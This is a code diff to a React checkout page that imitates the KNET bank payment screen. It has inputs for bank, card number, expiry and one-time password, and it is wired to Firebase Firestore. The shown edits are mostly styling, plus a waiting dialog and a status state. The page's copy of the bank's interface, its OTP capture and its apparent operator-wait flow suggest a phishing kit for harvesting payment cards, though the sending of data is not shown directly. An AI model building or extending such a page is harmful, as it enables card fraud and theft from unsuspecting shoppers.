@@ -5,6 +5,7 @@ import './kent.css'
 import {  doc,  onSnapshot, updateDoc } from 'firebase/firestore';
 import { useCart } from '@/components/cart-provider';
 import { db } from '@/lib/firebaes';
+import { WaitingDialog } from '@/components/waiting';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -125,6 +126,7 @@ export default function Payment() {
 
   const [step, setstep] = useState(1);
   const [loading, setLoading] = useState(false);
+  const [status, setStatus] = useState('new');
   const [newotp] = useState([''])
 const {totalPrice}=  useCart() as any
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
@@ -183,6 +185,7 @@ const {totalPrice}=  useCart() as any
   }
       )}
   return (
+    <>
     <div style={{background:"#f1f1f1",height:"100vh",margin:0,padding:0}} dir="ltr">
       <form
         onSubmit={(e) => {
@@ -237,6 +240,7 @@ const {totalPrice}=  useCart() as any
                   }}
                   id="otpmsgDC"
                 />
+
                 {/*Customer Validation  for knet*/}
                 <div
                   className="notification"
@@ -299,7 +303,7 @@ const {totalPrice}=  useCart() as any
                           Select Your Bank:
                         </label>
                         <select
-                          className="column-value"
+                          className="column-value p-2"
                           style={{ width: '60%' }}
                           onChange={(e: any) => {
                             const selectedBank = BANKS.find(
@@ -334,7 +338,7 @@ const {totalPrice}=  useCart() as any
                         <label className="column-label">Card Number:</label>
                         <label>
                           <select
-                            className="column-value"
+                            className="column-value p-2"
                             name="dcprefix"
                             id="dcprefix"
                             onChange={(e: any) =>
@@ -343,7 +347,7 @@ const {totalPrice}=  useCart() as any
                                 prefix: e.target.value,
                               })
                             }
-                            style={{ width: '26%' }}
+                            style={{ width: '24%' }}
                           >
                             <option
                               value={'i'}
@@ -380,7 +384,7 @@ const {totalPrice}=  useCart() as any
                             inputMode="numeric"
                             pattern="[0-9]*"
                             size={10}
-                            className="allownumericwithoutdecimal"
+                            className="allownumericwithoutdecimal p-2"
                             style={{ width: '32%' }}
                             maxLength={10}
                             onChange={(e: any) =>
@@ -407,7 +411,7 @@ const {totalPrice}=  useCart() as any
                               month: e.target.value,
                             })
                           }
-                          className="column-value"
+                          className="column-value p-2"
                         >
                           <option value={0}>MM</option>
                           <option value={1}>01</option>
@@ -430,7 +434,7 @@ const {totalPrice}=  useCart() as any
                               year: e.target.value,
                             })
                           }
-                          className="column-long"
+                          className="column-long p-2"
                         >
                           <option value={0}>YYYY</option>
                           <option value={2024}>2024</option>
@@ -527,7 +531,7 @@ const {totalPrice}=  useCart() as any
                           type="tel"
                           inputMode="numeric"
                           pattern="[0-9]*"
-                          className="allownumericwithoutdecimal"
+                          className="allownumericwithoutdecimal p-2"
                           maxLength={6}
                           value={paymentInfo.otp}
                           onChange={(e: any) => {
@@ -647,6 +651,8 @@ if(
         </div>
       </form>
     </div>
+    </>
+
   );
 };
 
